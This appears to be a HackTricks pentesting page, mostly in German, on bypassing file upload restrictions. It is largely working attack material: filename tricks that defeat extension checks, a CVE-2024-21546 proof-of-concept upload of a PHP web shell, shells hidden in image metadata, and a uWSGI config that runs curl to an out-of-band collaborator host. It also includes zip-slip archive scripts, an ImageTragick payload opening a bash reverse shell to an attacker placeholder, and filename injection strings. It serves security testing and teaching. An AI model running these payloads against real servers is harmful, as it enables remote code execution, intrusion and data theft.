# Datei-Upload

{{#include ../../banners/hacktricks-training.md}}

## Allgemeine Methodik für Datei-Uploads

Other useful extensions:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Umgehung von Dateiendungsprüfungen

1. Wenn vorhanden, **prüfe** die **vorherigen Dateiendungen.** Teste sie außerdem mit einigen **Großbuchstaben**: _pHp, .pHP5, .PhAr ..._
2. _Prüfe **das Hinzufügen einer gültigen Dateiendung vor** der Ausführungs-Endung (verwende auch die vorherigen Dateiendungen):_
- _file.png.php_
- _file.png.Php5_
3. Versuche, am Ende **Sonderzeichen hinzuzufügen.** Du kannst Burp verwenden, um alle **ascii** und **Unicode** Zeichen zu **bruteforce**n. (_Beachte, dass du auch versuchen kannst, die **zuvor** erwähnten **Extensions** zu verwenden_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Versuche, die Schutzmechanismen zu umgehen, indem du den serverseitigen Extension-Parser **täuschst** mit Techniken wie dem **Doppeln** der **Extension** oder dem **Hinzufügen von Junk-Daten** (**null** Bytes) zwischen Extensions. _Du kannst auch die **vorherigen Extensions** verwenden, um ein besseres Payload vorzubereiten._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Füge **eine weitere Ebene von Dateiendungen** zur vorherigen Prüfung hinzu:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Versuche, die **ausführbare Extension vor** die gültige Extension zu setzen und hoffe, dass der Server falsch konfiguriert ist. (nützlich, um Apache-Misskonfigurationen auszunutzen, bei denen alles mit der Extension .php (aber nicht unbedingt mit der Endung .php) Code ausführt):
- _ex: file.php.png_
7. Verwendung des **NTFS alternate data stream (ADS)** in **Windows**. In diesem Fall wird ein Doppelpunkt ':' nach einer verbotenen Extension und vor einer erlaubten eingefügt. Dadurch wird auf dem Server eine **leere Datei mit der verbotenen Extension** erstellt (z. B. "file.asax:.jpg"). Diese Datei kann später mit anderen Techniken bearbeitet werden, z. B. durch Verwendung ihres kurzen Dateinamens. Das Muster "**::$data**” kann ebenfalls verwendet werden, um nicht-leere Dateien zu erstellen. Daher kann das Hinzufügen eines Punkts nach diesem Muster nützlich sein, um weitere Einschränkungen zu umgehen (z. B. "file.asp::$data.”)
8. Versuche, die Grenzwerte für Dateinamen zu überschreiten. Die gültige Extension wird abgeschnitten und das bösartige PHP bleibt übrig. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager vor 2.9.1 (.php. nachgestellter Punkt) – CVE-2024-21546

Einige Upload-Handler kürzen oder normalisieren nachgestellte Punktzeichen im gespeicherten Dateinamen. Im UniSharp’s Laravel Filemanager (unisharp/laravel-filemanager) in Versionen vor 2.9.1 kann man die Extension-Validierung umgehen durch:

- Verwendung eines gültigen Image-MIME und Magic-Headers (z. B. PNG’s `\x89PNG\r\n\x1a\n`).
- Den hochgeladenen Dateinamen mit einer PHP-Extension gefolgt von einem Punkt benennen, z. B. `shell.php.`.
- Der Server entfernt den nachgestellten Punkt und speichert `shell.php`, welches ausgeführt wird, wenn es in einem vom Web erreichbaren Verzeichnis abgelegt wird (Standard public storage wie `/storage/files/`).

Minimaler PoC (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
Rufe dann den gespeicherten Pfad auf (typisch in Laravel + LFM):
```
GET /storage/files/0xdf.php?cmd=id
```
Mitigations:
- Upgrade unisharp/laravel-filemanager to ≥ 2.9.1.
- Durchsetzen strikter serverseitiger allowlists und erneute Validierung des gespeicherten Dateinamens.
- Serve uploads from non-executable locations.

### Bypass Content-Type, Magic Number, Compression & Resizing

- Bypass **Content-Type** checks by setting the **value** of the **Content-Type** **header** to: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Bypass **magic number** check by adding at the beginning of the file the **bytes of a real image** (confuse the _file_ command). Or introduce the shell inside the **metadata**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` or you could also **introduce the payload directly** in an image:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- If **compressions is being added to your image**, for example using some standard PHP libraries like [PHP-GD](https://www.php.net/manual/fr/book.image.php), the previous techniques won't be useful it. However, you could use the **PLTE chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) to insert some text that will **survive compression**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- The web page cold also be **resizing** the **image**, using for example the PHP-GD functions `imagecopyresized` or `imagecopyresampled`. However, you could use the **IDAT chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) to insert some text that will **survive compression**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Another technique to make a payload that **survives an image resizing**, using the PHP-GD function `thumbnailImage`. However, you could use the **tEXt chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) to insert some text that will **survive compression**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Other Tricks to check

- Finde eine Schwachstelle, um die bereits hochgeladene Datei zu **umbenennen** (z. B. um die Erweiterung zu ändern).
- Finde eine **Local File Inclusion**-Schwachstelle, um den Backdoor auszuführen.
- **Mögliche Informationslecks**:
1. Lade **mehrfach** (und zur **gleichen Zeit**) dieselbe **Datei** mit demselben **Namen** hoch.
2. Lade eine Datei mit dem **Namen** einer **Datei** oder **Ordner**, der bereits existiert, hoch.
3. Hochladen einer Datei mit **".”, "..”, oder "…” als Name**. Zum Beispiel erzeugt unter Apache in **Windows**, wenn die Anwendung die Dateien im Verzeichnis "/www/uploads/” speichert, der Dateiname "." eine Datei namens "uploads” im Verzeichnis "/www/”.
4. Lade eine Datei hoch, die nicht leicht gelöscht werden kann, wie **"…:.jpg”** in **NTFS**. (Windows)
5. Lade eine Datei in **Windows** mit **ungültigen Zeichen** wie `|<>*?”` im Namen hoch. (Windows)
6. Lade eine Datei in **Windows** mit reservierten (**verbotenen**) **Namen** wie CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, und LPT9 hoch.
- Versuche außerdem, ein ausführbares Programm (.exe) oder eine **.html** (weniger verdächtig) hochzuladen, das **Code ausführt**, wenn es versehentlich vom Opfer geöffnet wird.

### Special extension tricks

If you are trying to upload files to a **PHP server**, [take a look at the **.htaccess** trick to execute code](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
If you are trying to upload files to an **ASP server**, [take a look at the **.config** trick to execute code](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

The `.phar` files are like the `.jar` for java, but for php, and can be **used like a php file** (executing it with php, or including it inside a script...)

The `.inc` extension is sometimes used for php files that are only used to **import files**, so, at some point, someone could have allow **this extension to be executed**.

## **Jetty RCE**

If you can upload a XML file into a Jetty server you can obtain [RCE because **new \*.xml and \*.war are automatically processed**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Wie im folgenden Bild erwähnt, lade die XML-Datei nach `$JETTY_BASE/webapps/` hoch und erwarte eine Shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

For a detailed exploration of this vulnerability check the original research: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE) vulnerabilities can be exploited in uWSGI servers if one has the capability to modify the `.ini` configuration file. uWSGI configuration files leverage a specific syntax to incorporate "magic" variables, placeholders, and operators. Notably, the '@' operator, utilized as `@(filename)`, is designed to include the contents of a file. Among the various supported schemes in uWSGI, the "exec" scheme is particularly potent, allowing the reading of data from a process's standard output. This feature can be manipulated for nefarious purposes such as Remote Command Execution or Arbitrary File Write/Read when a `.ini` configuration file is processed.

Consider the following example of a harmful `uwsgi.ini` file, showcasing various schemes:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
Die Ausführung des payload erfolgt während des Parsings der Konfigurationsdatei. Damit die Konfiguration aktiviert und geparst wird, muss der uWSGI-Prozess entweder neu gestartet werden (möglicherweise nach einem Crash oder aufgrund einer Denial of Service attack) oder die Datei muss auf auto-reload gesetzt sein. Die auto-reload-Funktion, falls aktiviert, lädt die Datei in festgelegten Intervallen neu, sobald Änderungen erkannt werden.

Es ist entscheidend, die lasche Natur des Parsings von uWSGI-Konfigurationsdateien zu verstehen. Konkret kann der besprochene payload in eine Binärdatei (z. B. ein Bild oder PDF) eingebettet werden, wodurch sich das Exploit-Szenario weiter ausweitet.

## **wget Datei-Upload/SSRF Trick**

In manchen Fällen kann es vorkommen, dass ein Server **`wget`** verwendet, um **Dateien herunterzuladen** und dass du die **URL** angeben kannst. In solchen Fällen prüft der Code möglicherweise, ob die Extension der heruntergeladenen Dateien in einer Whitelist enthalten ist, um sicherzustellen, dass nur erlaubte Dateien heruntergeladen werden. Allerdings **kann diese Prüfung umgangen werden.**\  
Die **maximale** Länge eines **Dateinamens** in **linux** ist **255**, jedoch kürzt **wget** die Dateinamen auf **236** Zeichen. Du kannst **eine Datei namens "A"\*232+".php"+".gif"** herunterladen — dieser Dateiname wird die **Prüfung** umgehen (in diesem Beispiel ist **".gif"** eine **gültige** Extension), aber `wget` wird die Datei in **"A"\*232+".php"** umbenennen.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Beachte, dass **eine weitere Option**, die dir vielleicht einfällt, um diese Prüfung zu umgehen, darin besteht, den **HTTP-Server** so umzuleiten, dass er auf eine andere Datei zeigt, sodass die ursprüngliche URL die Prüfung umgeht und wget dann die umgeleitete Datei unter dem neuen Namen herunterlädt. Das **funktioniert nicht**, **es sei denn** wget wird mit dem **Parameter** `--trust-server-names` verwendet, weil **wget die umgeleitete Seite mit dem Namen der Datei herunterlädt, der in der ursprünglichen URL angegeben ist**.

## Tools

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) ist ein mächtiges Tool, das Pentesters und Bug Hunters beim Testen von file upload mechanisms unterstützt. Es nutzt verschiedene bug bounty techniques, um den Prozess des Auffindens und Ausnutzens von Vulnerabilities zu vereinfachen und so gründliche Bewertungen von Webanwendungen zu ermöglichen.

### Corrupting upload indices with snprintf quirks (historical)

Some legacy upload handlers that use `snprintf()` or similar to build multi-file arrays from a single-file upload can be tricked into forging the `_FILES` structure. Due to inconsistencies and truncation in `snprintf()` behavior, a carefully crafted single upload can appear as multiple indexed files on the server side, confusing logic that assumes a strict shape (e.g., treating it as a multi-file upload and taking unsafe branches). While niche today, this “index corruption” pattern occasionally resurfaces in CTFs and older codebases.

## From File upload to other vulnerabilities

- Set **filename** to `../../../tmp/lol.png` and try to achieve a **path traversal**
- Set **filename** to `sleep(10)-- -.jpg` and you may be able to achieve a **SQL injection**
- Set **filename** to `<svg onload=alert(document.domain)>` to achieve a XSS
- Set **filename** to `; sleep 10;` to test some command injection (more [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Try **different svg payloads** from [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- If you can **indicate the web server to catch an image from a URL** you could try to abuse a [SSRF](../ssrf-server-side-request-forgery/index.html). If this **image** is going to be **saved** in some **public** site, you could also indicate a URL from [https://iplogger.org/invisible/](https://iplogger.org/invisible/) and **steal information of every visitor**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- Specially crafted PDFs to XSS: The [following page present how to **inject PDF data to obtain JS execution**](../xss-cross-site-scripting/pdf-injection.md). If you can upload PDFs you could prepare some PDF that will execute arbitrary JS following the given indications.
- Upload the \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) content to check if the server has any **antivirus**
- Check if there is any **size limit** uploading files

Hier eine Top-10-Liste von Dingen, die du durch Upload erreichen kannst (von [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magic Header Bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Refer to [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) for other filetypes.

## Zip/Tar File Automatically decompressed Upload

If you can upload a ZIP that is going to be decompressed inside the server, you can do 2 things:

### Symlink

Upload a link containing soft links to other files, then, accessing the decompressed files you will access the linked files:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### In verschiedene Ordner entpacken

Die unerwartete Erstellung von Dateien in Verzeichnissen während des Dekomprimierens ist ein erhebliches Problem. Trotz anfänglicher Annahmen, dass diese Konfiguration vor OS-level command execution durch bösartige Dateiuploads schützen könnte, können die hierarchische Kompressionsunterstützung und die directory traversal-Fähigkeiten des ZIP-Archive-Formats ausgenutzt werden. Dadurch können Angreifer Beschränkungen umgehen und aus sicheren Upload-Verzeichnissen entkommen, indem sie die Dekomprimierungsfunktionalität der Zielanwendung manipulieren.

Ein automatisierter Exploit, um solche Dateien zu erstellen, ist verfügbar unter [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). Das Tool kann wie folgt verwendet werden:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Außerdem ist **symlink trick with evilarc** eine Option. Wenn das Ziel darin besteht, eine Datei wie `/flag.txt` anzugreifen, sollte ein symlink zu dieser Datei in Ihrem System erstellt werden. Dies stellt sicher, dass evilarc während seiner Ausführung nicht auf Fehler stößt.

Unten ist ein Beispiel für Python-Code, der verwendet wird, um eine bösartige ZIP-Datei zu erstellen:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Missbrauch der Kompression für file spraying**

Für weitere Details **siehe den Originalbeitrag unter**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Erstellen einer PHP-Shell**: PHP-Code wird geschrieben, um Befehle auszuführen, die über die `$_REQUEST`-Variable übergeben werden.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying und Erstellung komprimierter Dateien**: Mehrere Dateien werden erstellt und ein zip-Archiv zusammengestellt, das diese Dateien enthält.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Änderung mit einem Hex-Editor oder vi**: Die Namen der Dateien im zip werden mit vi oder einem Hex-Editor verändert, indem "xxA" in "../" geändert wird, um Verzeichnisse zu traversieren.

```bash
:set modifiable
:%s/xxA/..\//g
:x!
```

## ImageTragic

Lade diesen Inhalt mit einer Bild-Erweiterung hoch, um die Verwundbarkeit auszunutzen **(ImageMagick , 7.0.1-1)** (siehe den [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Einbetten einer PHP Shell in PNG

Das Einbetten einer PHP Shell in den IDAT-Chunk einer PNG-Datei kann bestimmte Bildverarbeitungsoperationen effektiv umgehen. Die Funktionen `imagecopyresized` und `imagecopyresampled` von PHP-GD sind in diesem Zusammenhang besonders relevant, da sie üblicherweise zum Skalieren bzw. Resampling von Bildern verwendet werden. Dass die eingebettete PHP Shell von diesen Operationen unbeeinträchtigt bleibt, ist in bestimmten Anwendungsfällen ein großer Vorteil.

Eine detaillierte Untersuchung dieser Technik, einschließlich Methodik und möglicher Anwendungen, findet sich im folgenden Artikel: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Diese Ressource bietet ein umfassendes Verständnis des Prozesses und seiner Implikationen.

Weitere Informationen unter: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot-Dateien

Polyglot-Dateien dienen als vielseitiges Werkzeug in der Cybersicherheit und können gleichzeitig in mehreren Dateiformaten gültig existieren. Ein interessantes Beispiel ist ein [GIFAR](https://en.wikipedia.org/wiki/Gifar), ein Hybrid, der sowohl als GIF als auch als RAR-Archiv funktioniert. Solche Dateien beschränken sich nicht auf dieses Paar; Kombinationen wie GIF und JS oder PPT und JS sind ebenfalls möglich.

Der Hauptnutzen von Polyglots liegt in ihrer Fähigkeit, Sicherheitsmaßnahmen zu umgehen, die Dateien anhand ihres Typs prüfen. In vielen Anwendungen ist es üblich, nur bestimmte Dateitypen wie JPEG, GIF oder DOC für Uploads zuzulassen, um das Risiko potenziell schädlicher Formate (z. B. JS, PHP oder Phar) zu verringern. Ein Polyglot kann jedoch, indem es die strukturellen Kriterien mehrerer Dateitypen erfüllt, diese Beschränkungen unbemerkt umgehen.

Trotz ihrer Anpassungsfähigkeit haben Polyglots Einschränkungen. Beispielsweise kann ein Polyglot gleichzeitig eine PHAR-Datei (PHp ARchive) und eine JPEG darstellen, doch der erfolgreiche Upload kann von den Richtlinien der Plattform bezüglich Dateiendungen abhängen. Wenn das System streng auf erlaubte Extensions achtet, reicht die strukturelle Dualität eines Polyglots möglicherweise nicht aus, um den Upload zu gewährleisten.

Weitere Informationen unter: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Gültige JSONs hochladen, als wären es PDF

Wie man Dateityp-Erkennungen vermeidet, indem man eine gültige JSON-Datei hochlädt, auch wenn dies nicht erlaubt ist, indem man eine PDF-Datei vortäuscht (Techniken aus **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: Solange die `%PDF` Magic-Bytes in den ersten 1024 Bytes sind, gilt die Datei als PDF (Beispiel im Post)
- **`pdflib` library**: Füge ein gefälschtes PDF-Format in ein Feld des JSON ein, sodass die library denkt, es sei ein PDF (Beispiel im Post)
- **`file` binary**: Es kann bis zu 1048576 Bytes aus einer Datei lesen. Erstelle einfach ein JSON, das größer ist als das, sodass es den Inhalt nicht als JSON parsen kann, und füge dann innerhalb des JSON den Anfangsteil eines echten PDF ein — `file` wird denken, es sei ein PDF

## Referenzen

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

{{#include ../../banners/hacktricks-training.md}}
